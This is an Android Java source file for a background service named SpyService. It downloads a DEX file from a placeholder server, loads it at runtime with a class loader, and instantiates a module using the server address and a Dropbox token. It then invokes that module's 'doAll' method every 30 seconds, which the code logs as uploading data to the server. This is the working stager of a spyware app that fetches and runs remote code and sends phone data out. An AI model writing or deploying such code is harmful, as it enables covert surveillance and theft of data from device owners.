package com.example.spyapp;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

import dalvik.system.PathClassLoader;

public class SpyService extends Service {

    private final String serviceTag = "SERVICE TAG";
    private Object instance = null;
    private Timer mTimer = null;

    private class DownloadDex extends AsyncTask<String, Void, File> {

        private final String ip = "<SERVER-IP>";
        private final String token = "<DROPBOX-USER-TOKEN>";

        @Override
        protected File doInBackground(String... params) {
            File dexFile = null;
            try {
                URL url = new URL("http://" + ip + ":8080/dex");
                HttpURLConnection con = (HttpURLConnection)url.openConnection();
                con.connect();
                InputStream inputStream = con.getInputStream();

                dexFile = new File(getExternalFilesDir(null), "classes3.dex");
                FileOutputStream fileOutputStream = new FileOutputStream(dexFile);
                byte[] buffer = new byte[2048];
                int count;
                while ((count = inputStream.read(buffer, 0, 2048)) != -1) {
                    fileOutputStream.write(buffer, 0, count);
                }
                con.getResponseMessage();

                fileOutputStream.flush();
                fileOutputStream.close();
                inputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

            return dexFile;
        }

        @Override
        protected void onPostExecute(File f) {
            Log.i(serviceTag, "Dex file downloaded");

            try {
                PathClassLoader classLoader = new PathClassLoader(f.getAbsolutePath(), getClassLoader());
                Class<?> clas = classLoader.loadClass("com.example.dexmodule.DexModule");
                instance = clas.getDeclaredConstructor(Context.class, String.class, String.class)
                        .newInstance(getBaseContext(), ip, token);

                mTimer = new Timer();
                long NOTIFY_INTERVAL = 30 * 1000;
                mTimer.scheduleAtFixedRate(new UploadDataTimerTask(), 0, NOTIFY_INTERVAL);
            } catch (IllegalAccessException
                    | InvocationTargetException
                    | NoSuchMethodException
                    | ClassNotFoundException
                    | InstantiationException e) {
                e.printStackTrace();
            }

            super.onPostExecute(f);
        }
    }

    class UploadDataTimerTask extends TimerTask {
        @Override
        public void run() {
            try {
                instance.getClass().getMethod("doAll").invoke(instance);
            } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException e) {
                e.printStackTrace();
            }

            Log.i(serviceTag, "Data uploaded to server");
        }
    }

    @Override
    public void onCreate() {
        Log.i(serviceTag, "Service created");

        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(serviceTag, "Service started");

        DownloadDex downloadDex = new DownloadDex();
        downloadDex.execute();

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.i(serviceTag, "Service destroyed");
        if (mTimer != null) {
            mTimer.cancel();
        }

        super.onDestroy();
    }
}